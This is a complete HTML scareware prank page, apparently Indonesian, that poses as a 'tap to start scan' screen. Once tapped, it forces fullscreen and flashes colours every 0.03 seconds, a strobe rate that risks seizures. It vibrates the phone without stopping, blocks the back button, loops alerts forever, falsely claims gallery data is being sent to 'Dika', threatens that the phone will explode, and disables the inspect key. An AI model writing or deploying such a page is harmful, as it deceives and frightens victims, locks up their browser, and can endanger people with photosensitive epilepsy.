<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚡ SYSTEM OVERLOAD ⚡</title>
    <style>
        * { cursor: none; }
        body {
            background-color: #000;
            margin: 0;
            overflow: hidden;
            font-family: 'Arial Black', Gadget, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            flex-direction: column;
        }

        #overlay-flash {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 1000;
            display: none;
            animation: intense-flash 0.03s infinite;
        }

        @keyframes intense-flash {
            0% { background: red; }
            33% { background: #000; }
            66% { background: blue; }
            100% { background: #fff; }
        }

        .content {
            position: relative;
            z-index: 1001;
            text-align: center;
            display: none;
        }

        h1 { font-size: 50px; margin: 0; color: yellow; text-shadow: 5px 5px #ff0000; }
        .sub-text { font-size: 20px; color: white; background: black; padding: 10px; }
        
        #start-screen {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #000;
            z-index: 2000;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #0f0;
            text-align: center;
            font-family: monospace;
        }
    </style>
</head>
<body onclick="launchChaos()">

    <div id="start-screen">
        <div>
            <p>> SYSTEM READY...</p>
            <p style="font-size: 24px; border: 2px solid #0f0; padding: 20px;">[ TAP TO START SCAN ]</p>
        </div>
    </div>

    <div id="overlay-flash"></div>

    <div class="content" id="ui">
        <h1>SUNGKEM KE DIKA!</h1>
        <div class="sub-text">HARDWARE MALFUNCTION DETECTED</div>
        <marquee scrollamount="20" style="font-size: 30px; background: yellow; color: black; font-weight: bold; margin-top: 20px;">
            SUNGKEM KE DIKA SEKARANG! SUNGKEM KE DIKA SEKARANG! 
        </marquee>
    </div>

    <script>
        function launchChaos() {
            // 1. FULLSCREEN INSTAN
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) { /* Safari */
                elem.webkitRequestFullscreen();
            }

            // 2. Sembunyikan layar awal & aktifkan visual
            document.getElementById('start-screen').style.display = 'none';
            document.getElementById('overlay-flash').style.display = 'block';
            document.getElementById('ui').style.display = 'block';

            // 3. GETARAN LEVEL MAX (Vibrate-Burst)
            // Menggunakan interval pendek agar getaran bertumpuk dan tidak berhenti
            if (navigator.vibrate) {
                setInterval(() => {
                    // Pola getar tanpa jeda (5 detik getar terus)
                    navigator.vibrate([5000]); 
                }, 100); 
            }

            // 4. KUNCI NAVIGASI BALIK
            history.pushState(null, null, location.href);
            window.onpopstate = function() {
                history.go(1);
                alert("GAK BISA KELUAR! LU HARUS SUNGKEM KE DIKA!");
            };

            // 5. SPAM ALERT & VIBRATE RE-TRIGGER
            setTimeout(() => {
                while(true) {
                    alert("⚠️ WARNING ⚠️\n\nSISTEM ERROR!\nCEPAT SUNGKEM KE DIKA!");
                    alert("LOG: Data Galeri dikirim ke Dika...");
                    alert("SUNGKEM ATAU HP LU MELEDAK!");
                    if (navigator.vibrate) navigator.vibrate(5000);
                }
            }, 1000);
        }

        // Mencegah Inspect Element (opsional)
        document.onkeydown = function(e) {
            if(e.keyCode == 123) return false;
        }
    </script>
</body>
</html>
